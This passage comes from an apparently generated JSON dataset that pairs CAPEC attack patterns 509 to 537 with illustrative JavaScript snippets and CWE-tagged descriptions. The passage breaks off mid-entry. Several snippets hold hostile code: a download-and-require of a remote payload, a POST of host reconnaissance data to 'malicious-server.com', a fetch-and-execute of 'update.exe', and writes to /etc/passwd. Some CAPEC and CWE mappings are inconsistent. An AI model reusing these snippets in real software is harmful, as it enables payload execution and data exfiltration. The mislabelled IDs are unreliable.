        "code_snippet": "const crypto = require('crypto');\nconst fs = require('fs');\n\n// Simulate obtaining a service ticket encrypted with RC4\nfunction getServiceTicket() {\n  const ticket = 'fakeServiceTicket'; // Placeholder for actual service ticket\n  const key = 'weakpassword'; // Weak password (CWE-521)\n  const cipher = crypto.createCipher('rc4', key);\n  let encrypted = cipher.update(ticket, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Save the ticket to disk (CWE-522)\nfunction saveTicketToDisk(ticket) {\n  fs.writeFileSync('ticket.txt', ticket);\n}\n\n// Simulate brute-forcing the ticket (CWE-308, CWE-309)\nfunction bruteForceTicket() {\n  const encryptedTicket = fs.readFileSync('ticket.txt', 'utf8');\n  const possibleKeys = ['weakpassword', '123456', 'password']; // Weak passwords\n  for (const key of possibleKeys) {\n    const decipher = crypto.createDecipher('rc4', key);\n    let decrypted;\n    try {\n      decrypted = decipher.update(encryptedTicket, 'hex', 'utf8');\n      decrypted += decipher.final('utf8');\n      if (decrypted === 'fakeServiceTicket') {\n        console.log('Cracked the ticket with key:', key);\n        return key;\n      }\n    } catch (err) {\n      // Ignore decryption errors\n    }\n  }\n  console.log('Failed to crack the ticket');\n  return null;\n}\n\nconst ticket = getServiceTicket();\nsaveTicketToDisk(ticket);\nbruteForceTicket();",
        "description": "This JavaScript code snippet simulates the Kerberoasting attack described in the CAPEC. It demonstrates how an attacker can exploit weak password practices (CWE-521) and insufficiently protected credentials (CWE-522) to obtain and crack a service ticket. The code first simulates obtaining a service ticket encrypted with RC4 using a weak password. It then saves this ticket to disk, representing the insecure storage of credentials. Finally, it attempts to brute-force the ticket using a list of weak passwords, highlighting the risks associated with single-factor authentication (CWE-308) and the use of weak passwords (CWE-521). The code illustrates the main idea of Kerberoasting by showing how an attacker can extract and crack service tickets to gain unauthorized access."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "const maliciousApp = () => {\n  const targetSaaS = 'https://trusted-saas.com/api/performAction';\n  const userSessionToken = localStorage.getItem('userSessionToken');\n\n  if (userSessionToken) {\n    fetch(targetSaaS, {\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/json',\n        'Authorization': `Bearer ${userSessionToken}`\n      },\n      body: JSON.stringify({ action: 'maliciousAction' })\n    })\n    .then(response => response.json())\n    .then(data => console.log('Action performed:', data))\n    .catch(error => console.error('Error:', error));\n  } else {\n    console.error('User session token not found');\n  }\n};\n\n// Simulate the malicious app being triggered\nmaliciousApp();",
        "description": "This JavaScript code snippet represents a 'SaaS User Request Forgery' attack. The malicious application leverages a previously authenticated user's session token, stored in the browser's local storage, to perform unauthorized actions on a third-party SaaS application. The code checks for the presence of the user's session token and, if found, sends a forged request to the SaaS application's API endpoint, impersonating the authenticated user. This attack exploits the implicit trust the SaaS application places on the authenticated session, bypassing proper origin validation and authorization checks (CWE-346, CWE-863, CWE-285)."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-215: Insertion of Sensitive Information Into Debugging Code\nconst DEBUG = true;\nconst sensitiveData = 'API_KEY=12345';\n\nif (DEBUG) {\n  console.log(`Debugging Info: ${sensitiveData}`); // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n}\n\n// CWE-434: Unrestricted Upload of File with Dangerous Type\nfunction uploadFile(file) {\n  const allowedExtensions = ['.txt', '.jpg'];\n  const fileExtension = path.extname(file.name);\n\n  if (!allowedExtensions.includes(fileExtension)) {\n    throw new Error('File type not allowed');\n  }\n\n  fs.writeFileSync(path.join(__dirname, 'uploads', file.name), file.data);\n}\n\n// CWE-506: Embedded Malicious Code\nfunction maliciousFunction() {\n  fs.writeFileSync('/etc/passwd', 'malicious content'); // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n}\n\n// Simulate an attacker infiltrating the IDE and embedding malicious code\nfunction infiltrateIDE() {\n  console.log('Infiltrating IDE...');\n  maliciousFunction();\n}\n\ninfiltrateIDE();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities that align with the CAPEC description of infiltrating a software development environment. The code includes:\n\n1. **CWE-215**: Sensitive information (an API key) is inserted into debugging code, which is then exposed via `console.log` if debugging is enabled.\n2. **CWE-200**: The sensitive information is exposed to unauthorized actors through the console output.\n3. **CWE-434**: A function `uploadFile` allows the upload of files but restricts the types. However, this can be bypassed if the allowed types are not comprehensive.\n4. **CWE-506**: A malicious function `maliciousFunction` writes malicious content to a sensitive system file (`/etc/passwd`), representing embedded malicious code.\n5. **CWE-497**: The malicious function exposes sensitive system-level information by modifying system files.\n\nThe `infiltrateIDE` function simulates an attacker infiltrating the IDE and executing the malicious function, representing the main idea of the CAPEC: infiltrating the development environment to implant malware and exfiltrate or manipulate sensitive data."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Simulate dependency on a third-party component\nconst thirdPartyComponent = require('untrusted-component');\n\n// Function to simulate hardware component substitution\nfunction substituteHardwareComponent() {\n  // Path to the baseline hardware component\n  const baselineComponentPath = path.join(__dirname, 'baselineComponent.js');\n  // Path to the malicious hardware component\n  const maliciousComponentPath = path.join(__dirname, 'maliciousComponent.js');\n\n  // Check if the baseline component exists\n  if (fs.existsSync(baselineComponentPath)) {\n    // Replace the baseline component with the malicious one\n    fs.copyFileSync(maliciousComponentPath, baselineComponentPath);\n    console.log('Hardware component substituted successfully.');\n  } else {\n    console.log('Baseline component not found.');\n  }\n}\n\n// Simulate the product development phase\nfunction developProduct() {\n  // Use the third-party component\n  thirdPartyComponent.initialize();\n  // Substitute the hardware component during development\n  substituteHardwareComponent();\n  // Continue with product development\n  console.log('Product development in progress...');\n}\n\ndevelopProduct();",
        "description": "This JavaScript code snippet simulates the concept of 'Hardware Component Substitution During Baselining' (CAPEC-1395). It demonstrates how an adversary could replace a baseline hardware component with a malicious one during the product development phase. The code also highlights dependencies on third-party components, which may be vulnerable or untrustworthy (CWE-1395, CWE-1329, CWE-1357). The 'substituteHardwareComponent' function checks for the existence of a baseline component and replaces it with a malicious component, representing the potential for hardware tampering. The 'developProduct' function simulates the product development process, including the initialization of a third-party component and the substitution of the hardware component."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "const fs = require('fs');\n\n// CWE-1263: Improper Physical Access Control\n// Simulating unauthorized access to documentation\nconst unauthorizedAccess = (filePath) => {\n  try {\n    // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    let data = fs.readFileSync(filePath, 'utf8');\n    console.log('Sensitive Data Accessed:', data);\n\n    // CWE-1059: Insufficient Technical Documentation\n    if (!data.includes('critical component')) {\n      console.error('Insufficient documentation detected.');\n      return;\n    }\n\n    // CWE-695: Use of Low-Level Functionality\n    // Altering the documentation to circumvent dial-down functionality\n    let alteredData = data.replace('restricted', 'unrestricted');\n\n    // CWE-222: Truncation of Security-relevant Information\n    alteredData = alteredData.substring(0, 100); // Truncate to obscure changes\n\n    // Write the altered documentation back to the file\n    fs.writeFileSync(filePath, alteredData, 'utf8');\n    console.log('Documentation altered successfully.');\n  } catch (err) {\n    console.error('Error accessing or altering the file:', err);\n  }\n};\n\n// Example usage\nunauthorizedAccess('path/to/documentation.txt');",
        "description": "This JavaScript code snippet simulates an attack where an unauthorized actor gains access to sensitive documentation (CWE-1263, CWE-200). The attacker checks for insufficient technical documentation (CWE-1059) and then alters the documentation to change 'restricted' to 'unrestricted' (CWE-695). The altered data is truncated to obscure the changes (CWE-222) before being written back to the file. This represents the CAPEC scenario where an attacker modifies documentation to circumvent dial-down functionality, allowing restricted technologies to be accessed by unauthorized parties."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "/* Insufficient Technical Documentation and Exposure of Sensitive System Information */\n\n// Function to initialize system with sensitive configuration\nfunction initializeSystem(config) {\n    // Missing documentation for design and insufficient technical documentation\n    // No clear description of what 'config' should contain\n    if (!config) {\n        throw new Error('Configuration is required');\n    }\n\n    // Use of low-level functionality\n    // Directly accessing system-level information\n    let systemInfo = getSystemInfo(); // This function is not documented\n    if (!systemInfo) {\n        throw new Error('Failed to retrieve system information');\n    }\n\n    // Improper following of specification by caller\n    // Assuming 'config' has a 'settings' property without validation\n    applySettings(config.settings); // This function is not documented\n}\n\n// Function to get system information (Sensitive Information Exposure)\nfunction getSystemInfo() {\n    // Exposing sensitive system information\n    return {\n        os: 'Linux',\n        version: '1.0.0',\n        secretKey: '12345' // Sensitive information\n    };\n}\n\n// Function to apply settings (Improper Following of Specification)\nfunction applySettings(settings) {\n    // No validation or documentation on what 'settings' should be\n    console.log('Applying settings:', settings);\n}\n\n// Example usage\ninitializeSystem({ settings: { theme: 'dark' } });",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker could alter documentation to produce an under-performing system. The code lacks sufficient technical documentation and design documentation, making it unclear what the 'config' parameter should contain. It also exposes sensitive system information through the 'getSystemInfo' function, which is not properly protected. The 'applySettings' function does not validate its input, leading to potential misuse. This snippet embodies the main idea of the CAPEC by showing how insufficient documentation and improper handling of specifications can lead to vulnerabilities that an attacker could exploit."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "const config = { maxRetries: 3, timeout: 5000 }; // Documentation altered to cause errors\n\nfunction fetchData(url) {\n  let retries = 0;\n  let success = false;\n  while (retries < config.maxRetries && !success) {\n    try {\n      // Simulate a fetch operation\n      console.log(`Fetching data from ${url} with timeout ${config.timeout}`);\n      // Simulate a timeout error\n      if (Math.random() > 0.5) throw new Error('Timeout');\n      success = true;\n      console.log('Data fetched successfully');\n    } catch (error) {\n      retries++;\n      console.log(`Retrying... (${retries})`);\n    }\n  }\n  if (!success) {\n    console.error('Failed to fetch data after maximum retries');\n  }\n}\n\nfetchData('https://example.com');",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker has altered the configuration documentation to cause errors in system design. The 'config' object contains parameters for 'maxRetries' and 'timeout', which are used in the 'fetchData' function. The function attempts to fetch data from a URL, retrying up to 'maxRetries' times if a simulated timeout error occurs. The altered documentation could lead to incorrect values in 'config', causing the function to fail more frequently than expected. This embodies the CAPEC idea of maliciously altering documentation to introduce errors, and relates to CWEs such as 'Insufficient Technical Documentation' (CWE-1059), 'Missing Documentation for Design' (CWE-1053), and 'Incorrect Provision of Specified Functionality' (CWE-684)."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "class HardwareComponent {\n  constructor() {\n    this.trusted = false;\n    this.maliciousCode = () => {\n      // Malicious behavior hidden within the component\n      console.log('Executing malicious code');\n      // Additional malicious actions can be added here\n    };\n  }\n\n  execute() {\n    if (!this.trusted) {\n      this.maliciousCode();\n    } else {\n      console.log('Executing normal operations');\n    }\n  }\n}\n\n// Simulating the insertion of a counterfeit component\nconst counterfeitComponent = new HardwareComponent();\ncounterfeitComponent.execute();",
        "description": "This JavaScript code snippet represents a counterfeit hardware component being inserted during product assembly, embodying the main idea of the CAPEC. The `HardwareComponent` class includes a `maliciousCode` method that simulates malicious behavior. The `execute` method checks if the component is trusted; if not, it executes the malicious code. This snippet highlights the CWE-506 (Embedded Malicious Code) by including hidden malicious behavior, CWE-1357 (Reliance on Insufficiently Trustworthy Component) by using an untrusted component, and CWE-1242 (Inclusion of Undocumented Features or Chicken Bits) by having undocumented malicious features. The counterfeit component is then instantiated and executed, demonstrating the potential threat."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "const hardwareSpecs = {\n  registerDefaults: {\n    secureRegister: 0x00, // CWE-1221: Incorrect Register Defaults\n    debugMode: false // CWE-1296: Incorrect Chaining or Granularity of Debug Components\n  },\n  lockBit: false // CWE-1231: Improper Prevention of Lock Bit Modification\n};\n\n// CWE-657: Violation of Secure Design Principles\nfunction alterHardwareSpecs(specs) {\n  specs.registerDefaults.secureRegister = 0xFF; // Insecure value\n  specs.debugMode = true; // Enable debug mode\n  specs.lockBit = true; // Lock bit can be modified\n}\n\n// CWE-1059: Insufficient Technical Documentation\n// Documentation is missing for the function and hardware specifications\nalterHardwareSpecs(hardwareSpecs);\n\nconsole.log(hardwareSpecs);",
        "description": "This JavaScript code snippet simulates the alteration of hardware design specifications, embodying the main idea of the CAPEC. The `hardwareSpecs` object represents the hardware design specifications with insecure defaults (CWE-1221) and a modifiable lock bit (CWE-1231). The `alterHardwareSpecs` function modifies these specifications to insecure values, violating secure design principles (CWE-657) and enabling debug mode (CWE-1296). Additionally, the code lacks sufficient technical documentation (CWE-1059), making it difficult to understand the changes and their implications. This snippet demonstrates how an attacker could alter hardware design specifications to introduce vulnerabilities."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "class HardwareComponent {\n  constructor(name, version) {\n    this.name = name;\n    this.version = version;\n    this.isTrusted = false; // CWE-1357: Insufficiently Trustworthy Component\n  }\n\n  updateFirmware() {\n    if (!this.isTrusted) {\n      console.log('Firmware update failed: Component is not trusted.'); // CWE-1329: Not Updateable\n      return;\n    }\n    console.log('Firmware updated successfully.');\n  }\n\n  injectError() {\n    console.log('Error injected into hardware component.'); // CWE-1334: Unauthorized Error Injection\n  }\n\n  executeMaliciousCode() {\n    console.log('Executing malicious code...'); // CWE-506: Embedded Malicious Code\n  }\n}\n\n// Simulate replacement with a malicious hardware component\nlet component = new HardwareComponent('CounterfeitComponent', '1.0');\ncomponent.executeMaliciousCode();\ncomponent.injectError();\ncomponent.updateFirmware();",
        "description": "This JavaScript code snippet defines a `HardwareComponent` class that simulates a hardware component with several vulnerabilities. The class includes methods to update firmware, inject errors, and execute malicious code. The `isTrusted` property is set to `false` to represent an insufficiently trustworthy component (CWE-1357). The `updateFirmware` method checks this property and fails to update if the component is not trusted, representing a reliance on a component that is not updateable (CWE-1329). The `injectError` method simulates unauthorized error injection (CWE-1334), and the `executeMaliciousCode` method simulates the execution of embedded malicious code (CWE-506). The code snippet demonstrates the main idea of CAPEC-452, where an adversary replaces legitimate hardware with a malicious component, leading to potential disruptions and further compromises."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// CWE-1395: Dependency on Vulnerable Third-Party Component\nconst vulnerableLib = require('vulnerable-lib');\n\n// CWE-506: Embedded Malicious Code\nfunction maliciousFunction() {\n  // CWE-509: Replicating Malicious Code (Virus or Worm)\n  http.get('http://malicious-server.com/payload', (res) => {\n    res.on('data', (chunk) => {\n      fs.writeFileSync('/tmp/malicious_payload', chunk);\n      require('/tmp/malicious_payload');\n    });\n  });\n}\n\n// CWE-1229: Creation of Emergent Resource\nfunction createEmergentResource() {\n  fs.writeFileSync('/tmp/emergent_resource', 'This is an emergent resource');\n}\n\n// CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nfunction injectErrors() {\n  fs.appendFileSync('/var/log/system.log', 'Injected error to degrade redundancy\\n');\n}\n\n// Main function to simulate the malicious software implantation\nfunction main() {\n  if (vulnerableLib.isVulnerable()) {\n    maliciousFunction();\n    createEmergentResource();\n    injectErrors();\n  }\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Malicious Software Implanted' in a supply chain distribution channel. It uses a vulnerable third-party library (CWE-1395) to check if the system is vulnerable. If it is, it executes a series of malicious actions: downloading and executing a payload from a malicious server (CWE-506 and CWE-509), creating an emergent resource that could be exploited (CWE-1229), and injecting errors into a system log to degrade hardware redundancy (CWE-1334). This code embodies the idea of implanting malicious software to cause disruption or enable further compromise when the system is deployed."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst fs = require('fs');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// CWE-829: Including functionality from an untrusted source\nconst maliciousLibrary = require('./maliciousLibrary');\n\napp.post('/upload', (req, res) => {\n  const { fileContent } = req.body;\n  \n  // CWE-506: Embedded malicious code\n  fs.writeFile('/tmp/uploadedFile', fileContent, (err) => {\n    if (err) {\n      return res.status(500).send('Error writing file');\n    }\n    \n    // CWE-89: SQL Injection vulnerability\n    const query = `INSERT INTO files (content) VALUES ('${fileContent}')`;\n    database.execute(query, (err) => {\n      if (err) {\n        return res.status(500).send('Database error');\n      }\n      res.send('File uploaded successfully');\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a web server using the Express framework. It includes several vulnerabilities that align with the CAPEC description of 'Rogue Integration Procedures' and related CWEs. The code imports a potentially malicious library (CWE-829), writes user-provided content to a file without proper validation (CWE-506), and constructs an SQL query using untrusted input, leading to a SQL Injection vulnerability (CWE-89). This setup demonstrates how an attacker could insert malicious components into a system, leading to further compromise when the system is deployed."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n      // Process the XML data\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('XML received');\n    });\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js that listens for incoming requests and attempts to parse the body of each request as XML using the 'xml2js' library. The server reads the entire request body and then parses it without any validation or throttling mechanisms. This makes the server vulnerable to an XML Flood attack (CAPEC-230), where an attacker can send a large number of XML requests to overwhelm the server. The code also demonstrates several related CWEs: CWE-770 (Allocation of Resources Without Limits or Throttling) as it does not limit the size or number of requests, CWE-112 (Missing XML Validation) as it does not validate the XML against a schema, and CWE-776 (Improper Restriction of Recursive Entity References in DTDs) as it does not control the structure of the XML, potentially allowing for recursive entity expansion attacks."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "const http = require('http');\nconst os = require('os');\nconst fs = require('fs');\n\n// Function to gather system information\nfunction gatherSystemInfo() {\n  const systemInfo = {\n    hostname: os.hostname(),\n    platform: os.platform(),\n    arch: os.arch(),\n    cpus: os.cpus(),\n    networkInterfaces: os.networkInterfaces()\n  };\n  return systemInfo;\n}\n\n// Function to send gathered information to an external server\nfunction sendInfoToServer(info) {\n  const options = {\n    hostname: 'malicious-server.com',\n    port: 80,\n    path: '/collect-info',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (d) => {\n      process.stdout.write(d);\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.write(JSON.stringify(info));\n  req.end();\n}\n\n// Main function to execute the malicious actions\nfunction main() {\n  const info = gatherSystemInfo();\n  sendInfoToServer(info);\n}\n\n// Execute the main function\nmain();",
        "description": "This JavaScript code snippet represents a malware-directed internal reconnaissance attack. It gathers sensitive system information such as hostname, platform, architecture, CPU details, and network interfaces using the 'os' module. This information is then sent to an external malicious server using an HTTP POST request. The code embodies the CAPEC concept by using malware to collect and exfiltrate sensitive system information, aligning with CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) and CWE-506 (Embedded Malicious Code)."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Simulate the use of a third-party component\nconst thirdPartyComponentPath = path.join(__dirname, 'thirdPartyComponent.js');\n\n// Check if the third-party component exists\nif (fs.existsSync(thirdPartyComponentPath)) {\n  // Load the third-party component\n  const thirdPartyComponent = require(thirdPartyComponentPath);\n  \n  // Use the third-party component\n  thirdPartyComponent.execute();\n} else {\n  console.error('Third-party component not found.');\n}\n\n// Simulate the third-party component with embedded malicious code\n// thirdPartyComponent.js\n// module.exports = {\n//   execute: function() {\n//     // Malicious code embedded here\n//     console.log('Executing malicious code...');\n//     // Example of malicious behavior: deleting a critical file\n//     fs.unlinkSync('/path/to/critical/file');\n//   }\n// };",
        "description": "This JavaScript code snippet demonstrates the concept of 'Provide Counterfeit Component' by simulating the use of a third-party component that could be counterfeit or malicious. The main script checks for the existence of a third-party component and then loads and executes it if found. The third-party component (represented in the commented-out section) contains malicious code that performs a harmful action, such as deleting a critical file. This example embodies the CAPEC idea by showing how an attacker could provide a counterfeit component with embedded malicious code, leading to potential disruption or compromise. The related CWEs are represented by the dependency on a potentially vulnerable or untrustworthy third-party component and the presence of embedded malicious code."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "class HardwareComponent {\n  constructor(name, version) {\n    this.name = name;\n    this.version = version;\n    this.isMalicious = false;\n  }\n\n  updateFirmware(newVersion) {\n    if (this.isMalicious) {\n      console.log('Firmware update blocked: Malicious component detected.');\n      return;\n    }\n    this.version = newVersion;\n    console.log(`Firmware updated to version ${newVersion}`);\n  }\n\n  injectMaliciousCode() {\n    this.isMalicious = true;\n    console.log('Malicious code injected into hardware component.');\n  }\n}\n\n// Simulating hardware component substitution\nlet originalComponent = new HardwareComponent('ComponentA', '1.0');\nlet maliciousComponent = new HardwareComponent('ComponentA', '1.0');\nmaliciousComponent.injectMaliciousCode();\n\n// Attempting to update firmware on the malicious component\nmaliciousComponent.updateFirmware('2.0');",
        "description": "This JavaScript code snippet simulates the substitution of a hardware component with a maliciously altered one, embodying the main idea of the CAPEC 'Hardware Component Substitution'. The `HardwareComponent` class represents a hardware component with methods to update firmware and inject malicious code. The `injectMaliciousCode` method marks the component as malicious, and the `updateFirmware` method checks for this flag before allowing a firmware update, simulating CWE-1329 (Reliance on Component That is Not Updateable) and CWE-506 (Embedded Malicious Code). The code demonstrates how an attacker could substitute a legitimate hardware component with a malicious one and prevent firmware updates, representing the potential disruption and compromise described in the CAPEC."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "const fs = require('fs');\n\n// Simulate downloading a malicious BIOS update\nfunction downloadMaliciousBIOS() {\n  return 'malicious_bios.bin';\n}\n\n// Simulate updating the BIOS with the malicious file\nfunction updateBIOS(biosFile) {\n  if (!isFirmwareUpdateable()) {\n    console.log('Firmware is not updateable.');\n    return;\n  }\n  if (!hasGranularAccessControl()) {\n    console.log('Insufficient granularity of access control.');\n    return;\n  }\n  if (containsMaliciousCode(biosFile)) {\n    console.log('Warning: Embedded malicious code detected.');\n    return;\n  }\n  if (!preventsLockBitModification()) {\n    console.log('Improper prevention of lock bit modification.');\n    return;\n  }\n  fs.writeFileSync('/path/to/bios', biosFile);\n  console.log('BIOS updated successfully with ' + biosFile);\n}\n\n// Mock functions to simulate vulnerabilities\nfunction isFirmwareUpdateable() {\n  return false; // CWE-1277\n}\n\nfunction hasGranularAccessControl() {\n  return false; // CWE-1220\n}\n\nfunction containsMaliciousCode(file) {\n  return file === 'malicious_bios.bin'; // CWE-506\n}\n\nfunction preventsLockBitModification() {\n  return false; // CWE-1231\n}\n\n// Main execution\nconst biosFile = downloadMaliciousBIOS();\nupdateBIOS(biosFile);",
        "description": "This JavaScript code snippet simulates the process of downloading and updating a BIOS with a malicious file, embodying the main idea of the CAPEC 'Altered Installed BIOS'. The code checks for several vulnerabilities related to the CWEs provided: whether the firmware is updateable (CWE-1277), if there is sufficient granularity of access control (CWE-1220), if the file contains malicious code (CWE-506), and if there is proper prevention of lock bit modification (CWE-1231). The code demonstrates how an attacker could exploit these weaknesses to install a malicious BIOS, leading to potential future exploitation."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.get('http://malicious-site.com/update', (res) => {\n  const filePath = './update.exe';\n  const fileStream = fs.createWriteStream(filePath);\n  res.pipe(fileStream);\n  fileStream.on('finish', () => {\n    fileStream.close();\n    console.log('Update downloaded. Executing...');\n    require('child_process').exec(filePath, (err, stdout, stderr) => {\n      if (err) {\n        console.error(`Execution error: ${err}`);\n        return;\n      }\n      console.log(`Output: ${stdout}`);\n    });\n  });\n}).on('error', (err) => {\n  console.error(`Download error: ${err.message}`);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable software update mechanism. It downloads an executable file from a remote location without verifying the origin or integrity of the code (CWE-494). The downloaded file is then executed, potentially allowing malicious code to run on the victim's system (CWE-506). This embodies the main idea of the CAPEC 'Malicious Manual Software Update', where an attacker introduces malicious code through a software update. The code lacks proper security measures, such as integrity checks and secure download practices, making it susceptible to exploitation."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "class HardwareComponent {\n  constructor() {\n    this.firmwareVersion = '1.0.0';\n    this.isUpdateable = false; // CWE-1277: Firmware Not Updateable\n  }\n\n  updateFirmware(newFirmware) {\n    if (this.isUpdateable) {\n      this.firmwareVersion = newFirmware;\n    } else {\n      console.log('Firmware update not supported.');\n    }\n  }\n\n  injectMaliciousCode() { // CWE-506: Embedded Malicious Code\n    console.log('Malicious code executed!');\n  }\n}\n\n// Simulate hardware update process\nfunction replaceHardwareComponent(oldComponent) {\n  // CWE-1329: Reliance on Component That is Not Updateable\n  let newComponent = new HardwareComponent();\n  if (!newComponent.isUpdateable) {\n    console.log('Warning: Replacing with non-updateable component.');\n  }\n  newComponent.injectMaliciousCode(); // Malicious action\n  return newComponent;\n}\n\n// Example usage\nlet currentComponent = new HardwareComponent();\nlet updatedComponent = replaceHardwareComponent(currentComponent);",
        "description": "This JavaScript code snippet simulates a hardware component replacement process, embodying the main idea of the CAPEC 'Malicious Hardware Update'. The `HardwareComponent` class represents a hardware component with a firmware version and an updateable flag. The `updateFirmware` method attempts to update the firmware but checks if the component is updateable (CWE-1277). The `injectMaliciousCode` method simulates the execution of malicious code (CWE-506). The `replaceHardwareComponent` function simulates the replacement of an old hardware component with a new one, warning if the new component is not updateable (CWE-1329) and executing malicious code as part of the replacement process. This represents the adversary's action of introducing malicious hardware during an update or replacement procedure."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "class MaliciousHardware {\n  constructor() {\n    this.firmware = this.loadFirmware();\n  }\n\n  loadFirmware() {\n    // CWE-506: Embedded Malicious Code\n    return `function maliciousFunction() {\n      // Malicious code that compromises the system\n      console.log('System compromised');\n    }`;\n  }\n\n  updateFirmware() {\n    // CWE-1329: Reliance on Component That is Not Updateable\n    throw new Error('Firmware update not supported');\n  }\n\n  useThirdPartyComponent() {\n    // CWE-1395: Dependency on Vulnerable Third-Party Component\n    const vulnerableComponent = require('vulnerable-component');\n    vulnerableComponent.execute();\n  }\n\n  accessConfidentialInfo() {\n    // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n    const confidentialInfo = this.getConfidentialInfo();\n    console.log(confidentialInfo); // Exposing confidential information\n  }\n\n  getConfidentialInfo() {\n    return 'Sensitive Data';\n  }\n}\n\nconst hardware = new MaliciousHardware();\nhardware.useThirdPartyComponent();\nhardware.accessConfidentialInfo();",
        "description": "This JavaScript code snippet represents a malicious hardware component that embodies the main idea of the CAPEC 'Malicious Gray Market Hardware'. The class 'MaliciousHardware' includes several methods that illustrate the related CWEs: 'loadFirmware' embeds malicious code (CWE-506), 'updateFirmware' shows reliance on a non-updateable component (CWE-1329), 'useThirdPartyComponent' demonstrates dependency on a vulnerable third-party component (CWE-1395), and 'accessConfidentialInfo' exposes unprotected confidential information (CWE-1297). The code simulates how an attacker could compromise a system using malicious hardware components sold on the gray market."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "const fs = require('fs');\nconst configFilePath = '/etc/app/config.json';\n\n// CWE-284: Improper Access Control\nif (fs.existsSync(configFilePath)) {\n  let configData = fs.readFileSync(configFilePath, 'utf8');\n  try {\n    let config = JSON.parse(configData);\n    // CWE-99: Improper Control of Resource Identifiers\n    let resourcePath = config.resourcePath;\n    // CWE-377: Insecure Temporary File\n    let tempFilePath = `/tmp/${resourcePath}.tmp`;\n    fs.writeFileSync(tempFilePath, 'Temporary data');\n    console.log('Configuration and temporary file created.');\n  } catch (e) {\n    console.error('Failed to parse configuration file.');\n  }\n} else {\n  console.error('Configuration file does not exist.');\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker could inject malicious data into a configuration file, leading to suboptimal system performance. The code reads a configuration file (CWE-284: Improper Access Control) and parses it. It then uses a value from the configuration file to create a temporary file (CWE-99: Improper Control of Resource Identifiers and CWE-377: Insecure Temporary File). If an attacker can modify the configuration file, they could inject a malicious resource path, causing the system to create or overwrite critical files, leading to potential system compromise. This embodies the CAPEC idea of injecting malicious data during configuration to alter system behavior."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
